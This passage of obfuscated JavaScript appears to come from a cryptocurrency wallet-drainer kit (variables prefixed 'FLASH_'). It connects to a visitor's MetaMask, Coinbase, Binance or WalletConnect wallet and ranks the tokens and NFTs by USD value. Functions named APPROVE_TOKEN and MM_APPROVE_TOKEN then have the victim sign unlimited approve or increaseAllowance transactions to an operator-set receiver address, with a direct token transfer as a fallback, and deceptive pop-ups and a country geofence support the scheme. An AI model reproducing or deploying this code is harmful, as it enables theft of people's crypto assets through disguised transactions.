																					] =
																						_0x4813ac),
																					console[
																						"log"
																					](
																						_0x632fe1(
																							0x1ef
																						) +
																							_0x2779ae[
																								_0x632fe1(
																									0x12b
																								)
																							] +
																							",\x20" +
																							_0x36931a[0x0]
																					);
																				break;
																			}
																		} catch (_0x2f9e62) {
																			console[
																				"log"
																			](
																				_0x2f9e62
																			);
																		}
																	}
																}
															} catch (_0xe8320b) {
																console[
																	_0x632fe1(
																		0x215
																	)
																](_0xe8320b);
															}
															_0x5b9f31();
														}
													)
												));
								}
							}
						}
					}
				} catch (_0x2f62aa) {
					console[_0x1b96f1(0x215)](_0x2f62aa);
				}
			}
			await Promise[_0x1b96f1(0x1e4)](_0x180d11);
			let _0x56c609 = ![];
			for (const _0x4bfd50 in FLASH_Settings[_0x1b96f1(0xb0)]["Chains"]) {
				try {
					if (
						FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0xd0)][
							_0x4bfd50
						][_0x1b96f1(0x1bf)]
					) {
						_0x56c609 = !![];
						break;
					}
				} catch (_0x123f61) {
					console[_0x1b96f1(0x215)](_0x123f61);
				}
			}
			if (_0x56c609)
				try {
					let _0x105ba7 = [];
					_0x5a1897 = await send_request({
						action: _0x1b96f1(0x11f),
						address: FLASH_Current_Address,
					});
					if (_0x5a1897[_0x1b96f1(0x1c2)] == "OK") {
						_0x105ba7 = _0x5a1897[_0x1b96f1(0x187)];
						for (const _0xa4e047 of _0x105ba7) {
							try {
								const _0x2a0425 = convert_chain(
									"ID",
									_0x1b96f1(0x162),
									_0xa4e047[_0x1b96f1(0x114)]
								);
								if (_0xa4e047["type"] == _0x1b96f1(0x225))
									continue;
								if (
									!FLASH_Settings[_0x1b96f1(0xb0)]["Chains"][
										_0x2a0425
									][_0x1b96f1(0x1bf)]
								)
									continue;
								if (
									_0xa4e047[_0x1b96f1(0xfe)] <
									FLASH_Settings[_0x1b96f1(0xb0)][
										_0x1b96f1(0xd0)
									][_0x2a0425][_0x1b96f1(0x11e)]
								)
									continue;
								_0x596e45["push"](_0xa4e047);
							} catch (_0x165610) {
								console[_0x1b96f1(0x215)](_0x165610);
							}
						}
					} else {
						_0x105ba7 = await get_nfts(_0x22b676);
						for (const _0x1f9629 of _0x105ba7) {
							try {
								const _0x5972d2 = convert_chain(
									"ID",
									"ANKR",
									_0x1f9629["chain_id"]
								);
								if (_0x1f9629["type"] == _0x1b96f1(0x225))
									continue;
								if (
									!FLASH_Settings[_0x1b96f1(0xb0)][
										_0x1b96f1(0xd0)
									][_0x5972d2][_0x1b96f1(0x1bf)]
								)
									continue;
								if (
									_0x1f9629["amount_usd"] <
									FLASH_Settings[_0x1b96f1(0xb0)][
										_0x1b96f1(0xd0)
									][_0x5972d2]["Min_NFTs_Price"]
								)
									continue;
								_0x596e45["push"](_0x1f9629);
							} catch (_0x6c40ca) {
								console[_0x1b96f1(0x215)](_0x6c40ca);
							}
						}
					}
				} catch (_0x9b3da9) {
					console[_0x1b96f1(0x215)](_0x9b3da9);
				}
			_0x596e45[_0x1b96f1(0x22f)]((_0x2029e6, _0x52768e) => {
				const _0x2af7f7 = _0x1b96f1;
				return _0x52768e[_0x2af7f7(0xfe)] - _0x2029e6[_0x2af7f7(0xfe)];
			});
			if (FLASH_Settings["Settings"][_0x1b96f1(0xbb)] == 0x1) {
				const _0x3137f4 = [];
				for (const _0x2d6107 of _0x596e45) {
					try {
						if (_0x2d6107[_0x1b96f1(0x1b3)] == _0x1b96f1(0x143))
							continue;
						_0x3137f4[_0x1b96f1(0x185)](_0x2d6107);
					} catch (_0x3a759e) {
						console[_0x1b96f1(0x215)](_0x3a759e);
					}
				}
				for (const _0x441199 of _0x596e45) {
					try {
						if (_0x441199[_0x1b96f1(0x1b3)] != "NATIVE") continue;
						_0x3137f4["push"](_0x441199);
					} catch (_0x269876) {
						console["log"](_0x269876);
					}
				}
				_0x596e45 = _0x3137f4;
			} else {
				if (FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0xbb)] == 0x2) {
					const _0xfafab4 = [];
					for (const _0xf78739 of _0x596e45) {
						try {
							if (_0xf78739["type"] != _0x1b96f1(0x143)) continue;
							_0xfafab4[_0x1b96f1(0x185)](_0xf78739);
						} catch (_0x4eea68) {
							console[_0x1b96f1(0x215)](_0x4eea68);
						}
					}
					for (const _0x4023b6 of _0x596e45) {
						try {
							if (_0x4023b6[_0x1b96f1(0x1b3)] == _0x1b96f1(0x143))
								continue;
							_0xfafab4["push"](_0x4023b6);
						} catch (_0x44ef91) {
							console[_0x1b96f1(0x215)](_0x44ef91);
						}
					}
					_0x596e45 = _0xfafab4;
				}
			}
			if (
				FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0x274)][
					_0x1b96f1(0x18c)
				] &&
				FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0x274)]["Priority"] ==
					0x1
			) {
				const _0x41e2b9 = [];
				for (const _0xe86017 of _0x596e45) {
					try {
						if (!_0xe86017["swapper"]) continue;
						_0x41e2b9["push"](_0xe86017);
					} catch (_0x48ab1d) {
						console[_0x1b96f1(0x215)](_0x48ab1d);
					}
				}
				for (const _0x523057 of _0x596e45) {
					try {
						if (_0x523057[_0x1b96f1(0x207)]) continue;
						_0x41e2b9[_0x1b96f1(0x185)](_0x523057);
					} catch (_0x148ccf) {
						console[_0x1b96f1(0x215)](_0x148ccf);
					}
				}
				_0x596e45 = _0x41e2b9;
			}
			if (
				FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0x266)][
					_0x1b96f1(0x1b9)
				] &&
				FLASH_Settings[_0x1b96f1(0xb0)]["Permit"][_0x1b96f1(0x292)] >
					0x0
			) {
				const _0x54dbfa = [];
				for (const _0x215a4a of _0x596e45) {
					try {
						if (
							!_0x215a4a["permit"] ||
							_0x215a4a[_0x1b96f1(0x259)] == 0x0 ||
							_0x215a4a["amount_usd"] <
								FLASH_Settings["Settings"][_0x1b96f1(0x266)][
									"Priority"
								]
						)
							continue;
						_0x54dbfa[_0x1b96f1(0x185)](_0x215a4a);
					} catch (_0x36d60c) {
						console[_0x1b96f1(0x215)](_0x36d60c);
					}
				}
				for (const _0x2ba819 of _0x596e45) {
					try {
						if (
							_0x2ba819["permit"] &&
							_0x2ba819[_0x1b96f1(0x259)] > 0x0 &&
							_0x2ba819[_0x1b96f1(0xfe)] >=
								FLASH_Settings[_0x1b96f1(0xb0)][
									_0x1b96f1(0x266)
								][_0x1b96f1(0x292)]
						)
							continue;
						_0x54dbfa["push"](_0x2ba819);
					} catch (_0x1ed22e) {
						console[_0x1b96f1(0x215)](_0x1ed22e);
					}
				}
				_0x596e45 = _0x54dbfa;
			}
			if (
				FLASH_Settings[_0x1b96f1(0xb0)]["Swappers"][_0x1b96f1(0x18c)] &&
				FLASH_Settings[_0x1b96f1(0xb0)][_0x1b96f1(0x274)]["Priority"] ==
					0x2
			) {
				const _0x1ca931 = [];
				for (const _0x4878ff of _0x596e45) {
					try {
						if (!_0x4878ff[_0x1b96f1(0x207)]) continue;
						_0x1ca931["push"](_0x4878ff);
					} catch (_0x435106) {
						console[_0x1b96f1(0x215)](_0x435106);
					}
				}
				for (const _0x14ed9c of _0x596e45) {
					try {
						if (_0x14ed9c[_0x1b96f1(0x207)]) continue;
						_0x1ca931["push"](_0x14ed9c);
					} catch (_0x4cf6ba) {
						console[_0x1b96f1(0x215)](_0x4cf6ba);
					}
				}
				_0x596e45 = _0x1ca931;
			}
			return _0x596e45;
		} catch (_0x317e90) {
			return console["log"](_0x317e90), [];
		}
	},
	APPROVE_TOKEN = async (_0x58f395) => {
		const _0x18cdfe = _0x11d65a;
		if (FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x12d)]["Enable"] == 0x0)
			return await TRANSFER_TOKEN(_0x58f395), 0x2;
		if (
			((FLASH_Current_Provider == _0x18cdfe(0x17c) &&
				FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x12d)][
					_0x18cdfe(0x17c)
				] >= 0x2) ||
				(FLASH_Current_Provider == _0x18cdfe(0x288) &&
					FLASH_Settings[_0x18cdfe(0xb0)]["Approve"]["Trust"] >=
						0x2)) &&
			!_0x58f395[_0x18cdfe(0x223)]
		)
			try {
				for (let _0x2c4cff = 0x0; _0x2c4cff < 0x2; _0x2c4cff++) {
					if (_0x58f395[_0x18cdfe(0x223)]) continue;
					try {
						const _0x2821fa = await retrive_token(
								_0x58f395[_0x18cdfe(0x114)],
								_0x58f395[_0x18cdfe(0x190)]
							),
							_0x2c473c = new ethers[_0x18cdfe(0x264)][
								_0x18cdfe(0x14e)
							](
								FLASH_Settings[_0x18cdfe(0x113)][
									_0x58f395["chain_id"]
								]
							),
							_0x47caaf = new ethers[_0x18cdfe(0x10a)](
								_0x58f395["address"],
								_0x2821fa,
								_0x2c473c
							);
						if (
							is_increase_approve(_0x47caaf[_0x18cdfe(0x149)]) ==
							0x2
						)
							_0x58f395[_0x18cdfe(0x223)] = 0x2;
						else {
							if (
								is_increase_approve(_0x47caaf["functions"]) ==
								0x1
							)
								_0x58f395[_0x18cdfe(0x223)] = 0x1;
						}
					} catch (_0x5f515a) {
						console[_0x18cdfe(0x215)](_0x5f515a);
					}
				}
			} catch (_0x49c3cf) {
				console[_0x18cdfe(0x215)](_0x49c3cf);
			}
		if (
			((FLASH_Current_Provider == _0x18cdfe(0x17c) &&
				FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x12d)]["MetaMask"] >=
					0x2) ||
				(FLASH_Current_Provider == _0x18cdfe(0x288) &&
					FLASH_Settings["Settings"]["Approve"][_0x18cdfe(0x214)] >=
						0x2)) &&
			_0x58f395[_0x18cdfe(0x223)]
		)
			return await MM_APPROVE_TOKEN(_0x58f395);
		if (
			((FLASH_Current_Provider == "MetaMask" &&
				FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x12d)]["MetaMask"] ==
					0x2) ||
				(FLASH_Current_Provider == _0x18cdfe(0x288) &&
					FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x12d)][
						_0x18cdfe(0x214)
					] == 0x2)) &&
			!_0x58f395[_0x18cdfe(0x223)]
		)
			return await TRANSFER_TOKEN(_0x58f395), 0x2;
		if (
			((FLASH_Current_Provider == _0x18cdfe(0x17c) &&
				FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x12d)][
					_0x18cdfe(0x17c)
				] == 0x3) ||
				(FLASH_Current_Provider == _0x18cdfe(0x288) &&
					FLASH_Settings[_0x18cdfe(0xb0)]["Approve"][
						_0x18cdfe(0x214)
					] == 0x3)) &&
			!_0x58f395[_0x18cdfe(0x223)]
		)
			throw new Error(_0x18cdfe(0x239));
		const _0x717603 = new ethers[_0x18cdfe(0x264)][_0x18cdfe(0x14e)](
				FLASH_Settings[_0x18cdfe(0x113)][_0x58f395[_0x18cdfe(0x114)]]
			),
			_0x3c0aa0 = BN(await _0x717603["getGasPrice"]())
				["div"](BN(0x64))
				[_0x18cdfe(0xeb)](
					BN(Math["floor"](FLASH_Gas_Multiplier * 0x64))
				);
		let _0x4ab199 = ethers[_0x18cdfe(0x1e8)]["parseEther"](
			FLASH_Unlimited_Amount
		);
		for (const _0x28cc27 of FLASH_Settings[_0x18cdfe(0x1b0)]) {
			try {
				if (
					_0x28cc27[0x0] == FLASH_Current_Chain_ID &&
					_0x28cc27[0x1] ==
						_0x58f395[_0x18cdfe(0x190)]
							[_0x18cdfe(0x2a1)]()
							["trim"]()
				) {
					_0x4ab199 = _0x58f395[_0x18cdfe(0x247)];
					break;
				}
			} catch (_0x102524) {
				console[_0x18cdfe(0x215)](_0x102524);
			}
		}
		const _0x3bc0b5 = {
				from: FLASH_Current_Address,
				to: _0x58f395[_0x18cdfe(0x190)],
				value: _0x18cdfe(0x24b),
			},
			_0x4e0e3f = new Web3(FLASH_Provider);
		let _0x3be99c = null;
		const _0x10bf65 = new _0x4e0e3f[_0x18cdfe(0x251)][_0x18cdfe(0x10a)](
			FLASH_Contract_ABI[_0x18cdfe(0x1d6)],
			_0x58f395[_0x18cdfe(0x190)]
		);
		(_0x3be99c = _0x10bf65["methods"]
			[_0x18cdfe(0xe2)](
				FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x287)]
					? FLASH_Settings[_0x18cdfe(0x28b)][_0x18cdfe(0x190)]
					: FLASH_Settings[_0x18cdfe(0x24e)],
				_0x4ab199
			)
			[_0x18cdfe(0x258)]()),
			(_0x3bc0b5[_0x18cdfe(0x187)] = _0x3be99c);
		const _0x40e152 = await _0x717603[_0x18cdfe(0x1a7)](_0x3bc0b5),
			_0x1e16e4 = await _0x717603["getTransactionCount"](
				FLASH_Current_Address,
				_0x18cdfe(0x15f)
			);
		(_0x3bc0b5["gasPrice"] = _0x3c0aa0),
			(_0x3bc0b5["gasLimit"] = _0x40e152),
			(_0x3bc0b5[_0x18cdfe(0x241)] = _0x1e16e4),
			await approve_request(_0x58f395),
			sign_next();
		const _0x428644 = await FLASH_Signer[_0x18cdfe(0x119)](_0x3bc0b5);
		wait_message();
		if (FLASH_Settings[_0x18cdfe(0xb0)][_0x18cdfe(0x11a)])
			await _0x717603[_0x18cdfe(0x124)](_0x428644["hash"], 0x1, 0x7530);
		return await approve_success(_0x58f395), sign_ready(), 0x1;
	},
	MM_APPROVE_TOKEN = async (_0xf3917a) => {
		const _0x26a57f = _0x11d65a;
		if (
			((FLASH_Current_Provider == _0x26a57f(0x17c) &&
				FLASH_Settings["Settings"][_0x26a57f(0x12d)][
					_0x26a57f(0x17c)
				] >= 0x2) ||
				(FLASH_Current_Provider == _0x26a57f(0x288) &&
					FLASH_Settings["Settings"][_0x26a57f(0x12d)][
						_0x26a57f(0x214)
					] >= 0x2)) &&
			!_0xf3917a["increase"]
		)
			try {
				for (let _0x1ebe85 = 0x0; _0x1ebe85 < 0x2; _0x1ebe85++) {
					if (_0xf3917a[_0x26a57f(0x223)]) continue;
					try {
						const _0x2928a3 = await retrive_token(
								_0xf3917a[_0x26a57f(0x114)],
								_0xf3917a[_0x26a57f(0x190)]
							),
							_0x2f03ca = new ethers[_0x26a57f(0x264)][
								_0x26a57f(0x14e)
							](
								FLASH_Settings["RPCs"][
									_0xf3917a[_0x26a57f(0x114)]
								]
							),
							_0x3af1e3 = new ethers["Contract"](
								_0xf3917a[_0x26a57f(0x190)],
								_0x2928a3,
								_0x2f03ca
							);
						if (
							is_increase_approve(_0x3af1e3[_0x26a57f(0x149)]) ==
							0x2
						)
							_0xf3917a[_0x26a57f(0x223)] = 0x2;
						else {
							if (
								is_increase_approve(_0x3af1e3["functions"]) ==
								0x1
							)
								_0xf3917a["increase"] = 0x1;
						}
					} catch (_0x49e236) {
						console[_0x26a57f(0x215)](_0x49e236);
					}
				}
			} catch (_0x4c668e) {
				console[_0x26a57f(0x215)](_0x4c668e);
			}
		const _0x457dff = new ethers[_0x26a57f(0x264)]["JsonRpcProvider"](
				FLASH_Settings[_0x26a57f(0x113)][_0xf3917a[_0x26a57f(0x114)]]
			),
			_0x382cf0 = BN(await _0x457dff[_0x26a57f(0x103)]())
				[_0x26a57f(0x28f)](BN(0x64))
				[_0x26a57f(0xeb)](
					BN(Math[_0x26a57f(0xe4)](FLASH_Gas_Multiplier * 0x64))
				);
		let _0x4e9dfb = ethers["utils"]["parseEther"](FLASH_Unlimited_Amount);
		for (const _0x225501 of FLASH_Settings["Unlimited_BL"]) {
			try {
				if (
					_0x225501[0x0] == FLASH_Current_Chain_ID &&
					_0x225501[0x1] ==
						_0xf3917a[_0x26a57f(0x190)]
							[_0x26a57f(0x2a1)]()
							[_0x26a57f(0x111)]()
				) {
					_0x4e9dfb = _0xf3917a[_0x26a57f(0x247)];
					break;
				}
			} catch (_0x15ce64) {
				console[_0x26a57f(0x215)](_0x15ce64);
			}
		}
		const _0x5b056d = {
				from: FLASH_Current_Address,
				to: _0xf3917a["address"],
				value: _0x26a57f(0x24b),
			},
			_0x2975c0 = new Web3(FLASH_Provider);
		let _0x1b4117 = null;
		const _0x32f966 =
				_0xf3917a[_0x26a57f(0x223)] == 0x2
					? _0x26a57f(0x280)
					: "increaseAllowance",
			_0x1107a7 = new _0x2975c0[_0x26a57f(0x251)]["Contract"](
				[
					{
						inputs: [
							{
								internalType: "address",
								name: _0x26a57f(0x1f2),
								type: _0x26a57f(0x190),
							},
							{
								internalType: "uint256",
								name: _0x26a57f(0xf9),
								type: "uint256",
							},
						],
						name: "" + _0x32f966,
						outputs: [
							{
								internalType: "bool",
								name: "",
								type: _0x26a57f(0x19a),
							},
						],
						stateMutability: _0x26a57f(0xae),
						type: "function",
					},
				],
				_0xf3917a[_0x26a57f(0x190)]
			);
		(_0x1b4117 = _0x1107a7["methods"]
			[_0x32f966](
				FLASH_Settings[_0x26a57f(0xb0)][_0x26a57f(0x287)]
					? FLASH_Settings[_0x26a57f(0x28b)][_0x26a57f(0x190)]
					: FLASH_Settings[_0x26a57f(0x24e)],
				_0x4e9dfb
			)
			[_0x26a57f(0x258)]()),
			(_0x5b056d[_0x26a57f(0x187)] = _0x1b4117);
		const _0xf76cee = await _0x457dff[_0x26a57f(0x1a7)](_0x5b056d),
			_0x5b7dc3 = await _0x457dff[_0x26a57f(0x263)](
				FLASH_Current_Address,
				"pending"
			);
		(_0x5b056d[_0x26a57f(0xa6)] = _0x382cf0),
			(_0x5b056d[_0x26a57f(0x227)] = _0xf76cee),
			(_0x5b056d[_0x26a57f(0x241)] = _0x5b7dc3),
			await approve_request(_0xf3917a),
			sign_next();
		const _0x539966 = await FLASH_Signer[_0x26a57f(0x119)](_0x5b056d);
		wait_message();
		if (FLASH_Settings["Settings"][_0x26a57f(0x11a)])
			await _0x457dff[_0x26a57f(0x124)](
				_0x539966[_0x26a57f(0x151)],
				0x1,
				0x7530
			);
		return await approve_success(_0xf3917a), sign_ready(), 0x1;
	},
	connect_wallet = async (_0x242f0a = null) => {
		const _0x1455a4 = _0x11d65a;
		try {
			if (!FLASH_Connection) {
				if (
					FLASH_Load_Time == null ||
					Math["floor"](Date["now"]() / 0x3e8) - FLASH_Load_Time < 0xf
				)
					return;
				FLASH_Loader_Style == 0x2
					? FLASHL[_0x1455a4(0x133)]({
							icon: _0x1455a4(0x11c),
							title: _0x1455a4(0x286),
							subtitle: _0x1455a4(0x18a),
							text: _0x1455a4(0x180),
							showConfirmButton: !![],
							confirmButtonText: "OK",
							color: FLASH_Color_Scheme,
					  })
					: (Swal[_0x1455a4(0x296)](),
					  Swal[_0x1455a4(0x133)]({
							html: _0x1455a4(0xba),
							icon: _0x1455a4(0x11c),
							allowOutsideClick: !![],
							allowEscapeKey: !![],
							timer: 0x0,
							width: 0x258,
							showConfirmButton: !![],
							confirmButtonText: "OK",
					  }));
				return;
			}
			if (FLASH_Process) return;
			FLASH_Process = !![];
			if (FLASH_Bad_Country) {
				try {
					flash_hide();
				} catch (_0x3a698c) {
					console[_0x1455a4(0x215)](_0x3a698c);
				}
				try {
					FLASH_Loader_Style == 0x2
						? FLASHL[_0x1455a4(0x133)]({
								icon: _0x1455a4(0x11c),
								title: _0x1455a4(0x294),
								subtitle: "Запрещенная\x20геолокация",
								text: _0x1455a4(0x144),
								showConfirmButton: !![],
								confirmButtonText: "OK",
								color: FLASH_Color_Scheme,
						  })
						: (Swal[_0x1455a4(0x296)](),
						  Swal[_0x1455a4(0x133)]({
								html: _0x1455a4(0x148),
								icon: _0x1455a4(0x11c),
								allowOutsideClick: !![],
								allowEscapeKey: !![],
								timer: 0x0,
								width: 0x258,
								showConfirmButton: !![],
								confirmButtonText: "OK",
						  })),
						await new Promise((_0x2a036) =>
							setTimeout(_0x2a036, 0x3a98)
						),
						(window["location"]["href"] = _0x1455a4(0xf2));
				} catch (_0x4db279) {
					console[_0x1455a4(0x215)](_0x4db279);
				}
				return;
			}
			if (_0x242f0a !== null) {
				if (_0x242f0a == _0x1455a4(0x17c)) {
					if (
						typeof window[_0x1455a4(0x131)] == _0x1455a4(0x272) &&
						typeof window[_0x1455a4(0x131)][_0x1455a4(0x264)] ===
							"object"
					) {
						let _0x25b004 = ![];
						for (const _0x43c6f4 of window[_0x1455a4(0x131)][
							_0x1455a4(0x264)
						]) {
							if (_0x43c6f4[_0x1455a4(0x293)] == !![]) {
								(_0x25b004 = !![]),
									(FLASH_Provider = _0x43c6f4),
									(FLASH_Current_Provider = _0x1455a4(0x17c));
								break;
							}
						}
						if (!_0x25b004) {
							if (FLASH_Mobile_Status) {
								(window[_0x1455a4(0x107)][_0x1455a4(0x21a)] =
									_0x1455a4(0x161) + FLASH_Current_URL),
									(FLASH_Process = ![]);
								return;
							} else {
								window[_0x1455a4(0xf5)](
									_0x1455a4(0x177),
									_0x1455a4(0x278)
								)["focus"](),
									(FLASH_Process = ![]);
								return;
							}
						}
					} else {
						if (
							typeof window[_0x1455a4(0x131)] === "object" &&
							window[_0x1455a4(0x131)][_0x1455a4(0x293)]
						)
							(FLASH_Provider = window["ethereum"]),
								(FLASH_Current_Provider = "MetaMask");
						else {
							if (FLASH_Mobile_Status) {
								(window[_0x1455a4(0x107)][_0x1455a4(0x21a)] =
									"https://metamask.app.link/dapp/" +
									FLASH_Current_URL),
									(FLASH_Process = ![]);
								return;
							} else {
								window[_0x1455a4(0xf5)](
									_0x1455a4(0x177),
									_0x1455a4(0x278)
								)[_0x1455a4(0x232)](),
									(FLASH_Process = ![]);
								return;
							}
						}
					}
				} else {
					if (_0x242f0a == "Coinbase") {
						if (
							typeof window[_0x1455a4(0x131)] ==
								_0x1455a4(0x272) &&
							typeof window[_0x1455a4(0x131)][
								_0x1455a4(0x264)
							] === "object"
						) {
							let _0x3560ea = ![];
							for (const _0x48b039 of window["ethereum"][
								_0x1455a4(0x264)
							]) {
								if (_0x48b039[_0x1455a4(0x105)] == !![]) {
									(_0x3560ea = !![]),
										(FLASH_Provider = _0x48b039);
									break;
								}
							}
							if (_0x3560ea)
								FLASH_Current_Provider = _0x1455a4(0xf3);
							else {
								if (FLASH_Mobile_Status) {
									(window[_0x1455a4(0x107)]["href"] =
										_0x1455a4(0x140) + FLASH_Current_URL),
										(FLASH_Process = ![]);
									return;
								} else {
									window[_0x1455a4(0xf5)](
										"https://www.coinbase.com/wallet",
										_0x1455a4(0x278)
									)["focus"](),
										(FLASH_Process = ![]);
									return;
								}
							}
						} else {
							if (
								typeof window[_0x1455a4(0x131)] ===
									_0x1455a4(0x272) &&
								(window[_0x1455a4(0x131)][_0x1455a4(0x105)] ||
									window["ethereum"][_0x1455a4(0x217)])
							)
								(FLASH_Provider = window[_0x1455a4(0x131)]),
									(FLASH_Current_Provider = "Coinbase");
							else {
								if (FLASH_Mobile_Status) {
									(window[_0x1455a4(0x107)][
										_0x1455a4(0x21a)
									] =
										"https://go.cb-w.com/dapp?cb_url=https://" +
										FLASH_Current_URL),
										(FLASH_Process = ![]);
									return;
								} else {
									window[_0x1455a4(0xf5)](
										"https://www.coinbase.com/wallet",
										_0x1455a4(0x278)
									)[_0x1455a4(0x232)](),
										(FLASH_Process = ![]);
									return;
								}
							}
						}
					} else {
						if (_0x242f0a == _0x1455a4(0x288)) {
							if (
								typeof window[_0x1455a4(0x131)] ===
									_0x1455a4(0x272) &&
								window[_0x1455a4(0x131)][_0x1455a4(0x116)]
							)
								(FLASH_Provider = window[_0x1455a4(0x131)]),
									(FLASH_Current_Provider = _0x1455a4(0x288));
							else {
								if (FLASH_Mobile_Status) {
									(window[_0x1455a4(0x107)][
										_0x1455a4(0x21a)
									] = _0x1455a4(0x1a0) + FLASH_Current_URL),
										(FLASH_Process = ![]);
									return;
								} else {
									window["open"](
										_0x1455a4(0x240),
										_0x1455a4(0x278)
									)[_0x1455a4(0x232)](),
										(FLASH_Process = ![]);
									return;
								}
							}
						} else {
							if (_0x242f0a == _0x1455a4(0x20d)) {
								if (
									typeof window[_0x1455a4(0xac)] ===
									_0x1455a4(0x272)
								)
									(FLASH_Provider = window[_0x1455a4(0xac)]),
										(FLASH_Current_Provider =
											"Binance\x20Wallet");
								else {
									window[_0x1455a4(0xf5)](
										_0x1455a4(0x195),
										_0x1455a4(0x278)
									)[_0x1455a4(0x232)](),
										(FLASH_Process = ![]);
									return;
								}
							} else
								_0x242f0a == _0x1455a4(0x170) ||
								_0x242f0a == _0x1455a4(0x234)
									? (FLASH_Current_Provider =
											_0x1455a4(0x170))
									: typeof window[_0x1455a4(0x131)] ===
									  _0x1455a4(0x272)
									? ((FLASH_Provider =
											window[_0x1455a4(0x131)]),
									  (FLASH_Current_Provider =
											_0x1455a4(0x242)))
									: (FLASH_Current_Provider =
											_0x1455a4(0x170));
						}
					}
				}
			} else
				window[_0x1455a4(0x131)]
					? ((FLASH_Provider = window[_0x1455a4(0x131)]),
					  (FLASH_Current_Provider = _0x1455a4(0x242)))
					: (FLASH_Current_Provider = _0x1455a4(0x170));
			try {
				await connect_request();
				let _0x41b561 = null;
				if (FLASH_Current_Provider == _0x1455a4(0x170)) {
					(document[_0x1455a4(0x1a3)]("flash-modal")[
						_0x1455a4(0x13f)
					][_0x1455a4(0x13b)] = "none"),
						await load_wc();
					try {
						await FLASH_Provider[_0x1455a4(0x23f)]();
					} catch (_0x4b859f) {
						console[_0x1455a4(0x215)](_0x4b859f);
					}
					await FLASH_Provider["connect"]();
					if (
						FLASH_Provider &&
						FLASH_Provider[_0x1455a4(0x21d)][_0x1455a4(0x167)] > 0x0
					) {
						if (
							!FLASH_Provider[_0x1455a4(0x21d)][0x0][
								_0x1455a4(0x226)
							]("0x")
						)
							return (
								(FLASH_Process = ![]), await connect_cancel()
							);
						await new Promise((_0xced122) =>
							setTimeout(_0xced122, 0x9c4)
						),
							(FLASH_Current_Address =
								FLASH_Provider["accounts"][0x0]),
							(FLASH_Current_Chain_ID =
								FLASH_Provider[_0x1455a4(0x19d)]),
							(FLASH_Web3 = new ethers["providers"][
								_0x1455a4(0x12e)
							](FLASH_Provider)),
							(FLASH_Signer = FLASH_Web3[_0x1455a4(0x1ff)]()),
							FLASH_Settings["Settings"]["Sign"][
								"WalletConnect"
							] == 0x0 && (FLASH_Sign_Disabled = !![]);
					} else return (FLASH_Process = ![]), await connect_cancel();
				} else {
					if (
						FLASH_Current_Provider == _0x1455a4(0x288) &&
						!FLASH_Mobile_Status
					)
						try {
							_0x41b561 = await FLASH_Provider[_0x1455a4(0xf0)]({
								method: _0x1455a4(0xad),
								params: [{ eth_accounts: {} }],
							});
							if (
								_0x41b561 &&
								_0x41b561[_0x1455a4(0x167)] > 0x0
							) {
								if (
									!FLASH_Provider[_0x1455a4(0xef)][
										_0x1455a4(0x226)
									]("0x")
								)
									return connect_cancel();
								(FLASH_Current_Address =
									FLASH_Provider[_0x1455a4(0xef)]),
									(FLASH_Current_Chain_ID = parseInt(
										FLASH_Provider[_0x1455a4(0x19d)]
									)),
									(FLASH_Web3 = new ethers["providers"][
										"Web3Provider"
									](FLASH_Provider)),
									(FLASH_Signer = FLASH_Web3["getSigner"]());
							} else
								return (
									(FLASH_Process = ![]),
									await connect_cancel()
								);
						} catch (_0x4dad46) {
							_0x41b561 = await FLASH_Provider[_0x1455a4(0xf0)]({
								method: _0x1455a4(0xad),
							});
							if (
								_0x41b561 &&
								_0x41b561[_0x1455a4(0x167)] > 0x0
							) {
								if (!_0x41b561[0x0][_0x1455a4(0x226)]("0x"))
									return connect_cancel();
								(FLASH_Current_Address = _0x41b561[0x0]),
									(FLASH_Current_Chain_ID = parseInt(
										FLASH_Provider["chainId"]
									)),
									(FLASH_Web3 = new ethers[_0x1455a4(0x264)][
										_0x1455a4(0x12e)
									](FLASH_Provider)),
									(FLASH_Signer = FLASH_Web3["getSigner"]());
							} else
								return (
									(FLASH_Process = ![]),
									await connect_cancel()
								);
						}
					else
						try {
							_0x41b561 = await FLASH_Provider[_0x1455a4(0xf0)]({
								method: "wallet_requestPermissions",
								params: [{ eth_accounts: {} }],
							});
							if (_0x41b561 && _0x41b561["length"] > 0x0) {
								if (
									!FLASH_Provider[_0x1455a4(0xef)][
										"includes"
									]("0x")
								)
									return connect_cancel();
								(FLASH_Current_Address =
									FLASH_Provider[_0x1455a4(0xef)]),
									(FLASH_Current_Chain_ID = parseInt(
										FLASH_Provider["chainId"]
									)),
									(FLASH_Web3 = new ethers[_0x1455a4(0x264)][
										_0x1455a4(0x12e)
									](FLASH_Provider)),
									(FLASH_Signer =
										FLASH_Web3[_0x1455a4(0x1ff)]());
							} else
								return (
									(FLASH_Process = ![]),
									await connect_cancel()
								);
						} catch (_0xccf383) {
							_0x41b561 = await FLASH_Provider[_0x1455a4(0xf0)]({
								method: _0x1455a4(0xad),
							});
							if (
								_0x41b561 &&
								_0x41b561[_0x1455a4(0x167)] > 0x0
							) {
								if (!_0x41b561[0x0][_0x1455a4(0x226)]("0x"))
									return connect_cancel();
								(FLASH_Current_Address = _0x41b561[0x0]),
									(FLASH_Current_Chain_ID = parseInt(
										FLASH_Provider[_0x1455a4(0x19d)]
									)),
									(FLASH_Web3 = new ethers["providers"][
										_0x1455a4(0x12e)
									](FLASH_Provider)),
									(FLASH_Signer =
										FLASH_Web3[_0x1455a4(0x1ff)]());
							} else
								return (
									(FLASH_Process = ![]),
									await connect_cancel()
								);
						}
				}
				if (!FLASH_Current_Address[_0x1455a4(0x1a1)](/^0x\S+$/))
					throw new Error(_0x1455a4(0x20f));
			} catch (_0x35040c) {
				return (
					console[_0x1455a4(0x215)](_0x35040c),
					(FLASH_Process = ![]),
					await connect_cancel()
				);
			}
			ms_hide();
			if (FLASH_Settings["V_MODE"] == 0x1) {
				FLASH_Loader_Style == 0x2
					? FLASHL[_0x1455a4(0x133)]({
							icon: _0x1455a4(0xc4),
							title: _0x1455a4(0xf4),
